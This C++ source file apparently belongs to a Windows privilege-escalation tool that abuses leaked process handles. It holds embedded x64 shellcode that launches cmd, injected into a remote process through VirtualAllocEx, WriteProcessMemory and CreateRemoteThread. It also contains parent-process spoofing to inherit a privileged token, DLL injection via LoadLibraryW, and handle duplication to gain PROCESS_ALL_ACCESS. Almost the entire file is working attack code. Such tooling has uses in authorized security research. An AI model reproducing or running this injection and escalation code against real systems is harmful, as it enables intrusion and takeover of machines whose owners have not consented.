#include "ExploitProcess.h"
#include "ElhHelper.h"

bool ExploitProcess::exploitAllAccess(HANDLE& hTgt) {
    unsigned char sc[] = {
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48,
        0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
        0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
        0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0,
        0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
        0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41,
        0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x6d, 0x64,
        0x00
    };

    printf("[+] Allocating and writing shellcode to memory in the remote process\n");
    LPVOID lpBuffer = VirtualAllocEx(hTgt, NULL, sizeof(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpBuffer == NULL) {
        printf("[*] Failed to allocate memory : %i\n", GetLastError());
        return false;
    }

    if (!WriteProcessMemory(hTgt, lpBuffer, sc, sizeof(sc), NULL)) {
        printf("[*] Failed to write shellcode : %i\n", GetLastError());
        return false;
    }

    printf("[+] Executing shellcode through 'CreateRemoteThread()'\n");
    if (!CreateRemoteThread(hTgt, NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, 0, 0, NULL) != NULL) {
        printf("[*] Failed to create thread : %i\n", GetLastError());
        return false;
    }

    return true;
}

bool ExploitProcess::exploitCreateProcess(HANDLE& hTgt) {
    STARTUPINFOEXW si = { sizeof(STARTUPINFOEXW) };
    PROCESS_INFORMATION pi;

    SIZE_T szAttributes = 0;

    printf("[+] Initializing and updating process attribute list to inherit parent token\n");
    InitializeProcThreadAttributeList(NULL, 1, 0, &szAttributes);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, szAttributes);
    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &szAttributes)) {
        printf("[*] Failed to initialize process attributes : %i\n", GetLastError());
        return false;
    }

    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hTgt, sizeof(HANDLE), NULL, NULL)) {
        printf("[*] Failed to update process attributes : %i\n", GetLastError());
        return false;
    }

    printf("[+] Calling 'CreateProcessW()' to create child process\n");
    if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &si.StartupInfo, &pi)) {
        printf("[*] Failed to create process : %i\n", GetLastError());
        return false;
    }

    return true;
}


bool ExploitProcess::exploitCreateThreadAndWrite(HANDLE& hTgt) {
    printf("[+] Getting address for 'LoadLibraryW()'\n");
    FARPROC pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        printf("[*] Failed to locate 'LoadLibraryW' : %i\n", GetLastError());
        return false;
    }

    std::wstring wsDllPath = ElhHelper::getELHDirectory() + L"\\exploitThread.dll";
    wprintf(L"[+] Writing DLL to '%s'\n", wsDllPath.c_str());
    std::vector<BYTE> decodedData = ElhHelper::decodeBase64(exploitThreadDllBase64);
    if (!ElhHelper::writeDataToFile(wsDllPath, decodedData)) {
        printf("[*] Failed to write DLL\n");
        return false;
    }

    printf("[+] Finding a writable region within NTDLL to store the DLL path\n");
    SIZE_T dwLibraryPathSize = (wsDllPath.length() + 1) * sizeof(wchar_t);
    DWORD64 dwFreeSpace = ElhHelper::findNullBytes(GetModuleHandle(L"ntdll.dll"), dwLibraryPathSize);
    if (dwFreeSpace == 0) {
        printf("[*] Failed to find a writable or large enough region to store path\n");
        return false;
    }

    printf("[+] Writing DLL path to 0x%llx\n", dwFreeSpace);
    if (!WriteProcessMemory(hTgt, reinterpret_cast<LPVOID>(dwFreeSpace), wsDllPath.c_str(), dwLibraryPathSize, NULL)) {
        printf("[*] Failed to write path : %i\n", GetLastError());
        return false;
    }

    printf("[+] Creating thread in remote process to to load DLL\n");
    HANDLE hThread = CreateRemoteThread(hTgt, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, reinterpret_cast<LPVOID>(dwFreeSpace), 0, NULL);
    if (hThread == NULL) {
        printf("[*] Failed to create thread : %i\n", GetLastError());
        return false;
    }

    return true;
}

bool ExploitProcess::exploitDupHandle(HANDLE& hTgt) {
    HANDLE hDupeTgt;
    printf("[+] Duplicating process handle to get PROCESS_ALL_ACCESS rights\n");
    if (!DuplicateHandle(hTgt, GetCurrentProcess(), GetCurrentProcess(), &hDupeTgt, PROCESS_ALL_ACCESS, 0, 0)) {
        printf("[*] Failed to duplicate handle : %i\n", GetLastError());
        return false;
    }

    return exploitAllAccess(hDupeTgt);
}